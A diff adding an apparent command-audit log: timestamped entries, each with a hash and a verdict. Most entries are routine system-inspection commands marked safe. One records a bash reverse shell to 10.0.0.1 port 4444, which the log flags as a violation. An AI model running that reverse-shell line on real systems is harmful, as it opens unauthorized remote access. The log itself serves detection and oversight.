@@ -1,0 +1,70 @@
+
+--- AUDIT COMMAND LINE ---
+Timestamp: 2026-05-04 18:25:15
+Hash: fd1bf7a140e0717c7b363b51f6ddf20f822c5bb59923127cf55e865f6d37958b
+Detail: Ls -la
+Result: SAFE
+----------------------------------
+
+--- AUDIT COMMAND LINE ---
+Timestamp: 2026-05-04 18:39:59
+Hash: fd1bf7a140e0717c7b363b51f6ddf20f822c5bb59923127cf55e865f6d37958b
+Detail: Ls -la
+Result: SAFE
+----------------------------------
+
+--- AUDIT COMMAND LINE ---
+Timestamp: 2026-05-04 18:42:35
+Hash: 5fea328091074ae9ea0fdbff05add395c12a92e477ff9447f6351c955a9e9ee1
+Detail: ip addr show eth0
+Result: SAFE
+----------------------------------
+
+--- AUDIT COMMAND LINE ---
+Timestamp: 2026-05-04 18:43:14
+Hash: 235d7bee74bff1af3099917951e9c74d67693a13536cef07b1b34cd49de42345
+Detail: ps -aux --sort=-%mem | head -n 10
+Result: SAFE
+----------------------------------
+
+--- AUDIT COMMAND LINE ---
+Timestamp: 2026-05-04 18:43:42
+Hash: 8d4d1430a45342d9ef29420220ec3b189afde3a5494944c914dd32f80534c3db
+Detail: df -h --total
+Result: SAFE
+----------------------------------
+
+--- AUDIT COMMAND LINE ---
+Timestamp: 2026-05-04 18:44:07
+Hash: 986b8a29f09ff2b78cb0156502e344d73e13c81c2f30f4ef68c85985aa5b8679
+Detail: lscpu | grep "Model name"
+Result: SAFE
+----------------------------------
+
+--- AUDIT COMMAND LINE ---
+Timestamp: 2026-05-04 18:44:45
+Hash: 40406ec96e455be55a26626bfcb0559b9c8827f60ecdb073ac6b378809fbf82c
+Detail: tail -n 50 /var/log/syslog
+Result: SAFE
+----------------------------------
+
+--- AUDIT COMMAND LINE ---
+Timestamp: 2026-05-04 18:45:29
+Hash: 374ac26a5d9b863ace579a9c13b7944878ed3abd089bcf3353029c0e43b1fc23
+Detail: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+Result: RAA VIOLATION: Reverse shell command detected - establishes unauthorized remote access to 10.0.0.1:4444.
+----------------------------------
+
+--- AUDIT COMMAND LINE ---
+Timestamp: 2026-05-04 19:12:41
+Hash: 1de700c29687cae34561545f50d3c8b3d9afe88e04cc11069f8a6dc6e4ce9464
+Detail: ls -la
+Result: SAFE
+----------------------------------
+
+--- AUDIT COMMAND LINE ---
+Timestamp: 2026-05-04 19:12:54
+Hash: 1de700c29687cae34561545f50d3c8b3d9afe88e04cc11069f8a6dc6e4ce9464
+Detail: ls -la
+Result: SAFE
+----------------------------------
